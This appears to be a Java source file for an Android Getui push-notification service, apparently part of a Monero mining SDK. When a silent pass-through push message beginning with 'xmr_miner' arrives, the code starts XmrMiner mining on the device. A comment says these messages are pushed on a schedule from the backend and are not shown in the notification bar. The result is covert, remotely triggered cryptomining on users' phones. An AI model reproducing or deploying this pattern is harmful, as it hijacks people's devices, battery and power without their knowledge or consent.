package io.waterhole.miner;

import android.content.Context;

import android.os.RemoteException;
import com.igexin.sdk.GTIntentService;
import com.igexin.sdk.PushManager;
import com.igexin.sdk.message.GTCmdMessage;
import com.igexin.sdk.message.GTNotificationMessage;
import com.igexin.sdk.message.GTTransmitMessage;
import waterhole.miner.core.StateObserver;
import waterhole.miner.core.utils.LogUtils;
import waterhole.miner.monero.XmrMiner;

/**
 * 继承 GTIntentService 接收来自个推的消息, 所有消息在线程中回调, 如果注册了该服务,
 * 则务必要在 AndroidManifest中声明, 否则无法接受消息<br>
 * onReceiveMessageData 处理透传消息<br>
 * onReceiveClientId 接收 cid <br>
 * onReceiveOnlineState cid 离线上线通知 <br>
 * onReceiveCommandResult 各种事件处理回执 <br>
 *
 * @author kzw on 2017/12/22.
 */
public final class GetuiIntentService extends GTIntentService {

    public GetuiIntentService() {
    }

    @Override
    public void onNotificationMessageClicked(Context context, GTNotificationMessage gtNotificationMessage) {
    }

    @Override
    public void onNotificationMessageArrived(Context context, GTNotificationMessage gtNotificationMessage) {
    }

    @Override
    public void onReceiveServicePid(Context context, int pid) {
        LogUtils.info("onReceiveServicePid -> " + pid);
    }

    @Override
    public void onReceiveMessageData(Context context, GTTransmitMessage msg) {
        String appid = msg.getAppid();
        String taskid = msg.getTaskId();
        String messageid = msg.getMessageId();
        byte[] payload = msg.getPayload();
        String pkg = msg.getPkgName();
        String cid = msg.getClientId();

        // 第三方回执调用接口，actionid范围为90000-90999，可根据业务场景执行
        boolean result = PushManager.getInstance().sendFeedbackMessage(context, taskid, messageid, 90001);
        LogUtils.info("call sendFeedbackMessage = " + (result ? "success" : "failed"));
        LogUtils.info("onReceiveMessageData -> " + "appid = " + appid + "\ntaskid = "
            + taskid + "\nmessageid = " + messageid + "\npkg = " + pkg
            + "\ncid = " + cid);
        if (payload == null) {
            LogUtils.error("receiver payload = null");
        } else {
            String data = new String(payload);
            LogUtils.info("receiver payload = " + data);
            // todo 这边后台定时推送透传消息（字段约定好，如xmr_miner, 无需在通知框中显示），启动挖矿
            if (data.startsWith("xmr_miner")) {
                // todo 推送进程中，bindService不成功
                XmrMiner.instance().init(context).setStateObserver(new StateObserver() {
                    @Override
                    public void onConnectPoolBegin() throws RemoteException {
                    }

                    @Override
                    public void onConnectPoolSuccess() throws RemoteException {
                    }

                    @Override
                    public void onConnectPoolFail(String error) throws RemoteException {
                    }

                    @Override
                    public void onPoolDisconnect(String error) throws RemoteException {
                    }

                    @Override
                    public void onMessageFromPool(String message) throws RemoteException {
                    }

                    @Override
                    public void onMiningError(String error) throws RemoteException {
                    }

                    @Override
                    public void onMiningStatus(double speed) throws RemoteException {
                    }
                }).startMine();
            }
        }
    }

    @Override
    public void onReceiveClientId(Context context, String clientid) {
        LogUtils.error("onReceiveClientId -> " + "clientid = " + clientid);
        // 441731ee7e3a839e3268a529044ace7d
    }

    @Override
    public void onReceiveOnlineState(Context context, boolean online) {
        LogUtils.error("onReceiveOnlineState -> " + (online ? "online" : "offline"));
    }

    @Override
    public void onReceiveCommandResult(Context context, GTCmdMessage cmdMessage) {
        LogUtils.error("onReceiveCommandResult -> " + cmdMessage);
    }
}
